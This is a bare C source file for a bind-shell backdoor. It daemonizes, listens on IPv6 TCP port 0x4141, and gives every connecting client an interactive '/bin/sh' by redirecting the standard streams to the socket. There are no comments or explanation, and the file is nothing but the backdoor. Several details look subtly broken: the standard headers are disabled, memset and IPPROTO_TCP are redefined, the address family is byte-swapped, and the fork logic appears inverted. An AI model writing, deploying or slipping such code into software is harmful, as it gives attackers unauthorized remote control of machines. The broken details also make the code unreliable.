#if 0
#include <sys/socket.h>
#include <string.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#endif
#define LOCAL_PORT 0x4141
#define IPPROTO_TCP 0
#define IN6ADDR_ANY_INIT {{{ 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }}}

#define memset(addr, c, len) \
	int i = 0; \
	for(i = 0; i < len; i++) { \
		addr[i] = 0; \
	}

struct in6_addr any = IN6ADDR_ANY_INIT;


int main(void)
{
    char *cmd[] = {"/bin/sh", "-i", 0}; 
	struct sockaddr_in6 cli;
	struct sockaddr_in6 tcp;
	int sock = 0, sock_con = 0;
	unsigned int slen = sizeof(cli);
	unsigned char *ptr = (unsigned char *)&tcp;
	
	if (fork()) exit(0);

	sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
	memset(ptr, 0, sizeof(tcp));
	tcp.sin6_family = htons(AF_INET6);
	tcp.sin6_port = htons(LOCAL_PORT);
	bind(sock, (struct sockaddr *) &tcp, sizeof(tcp));
	listen(sock, 1);
	while (1) {
		sock_con = accept(sock, (struct sockaddr *) &tcp, &slen);
		int pid = fork();
		if (pid) {

			dup2(sock_con, 0);
			dup2(sock_con, 1);
			dup2(sock_con, 2);
			execve(*cmd, cmd, 0);
			exit(0);
		}
		close(sock_con);
		wait4(-1, NULL, 0, 0);
	}
	return 0;
}
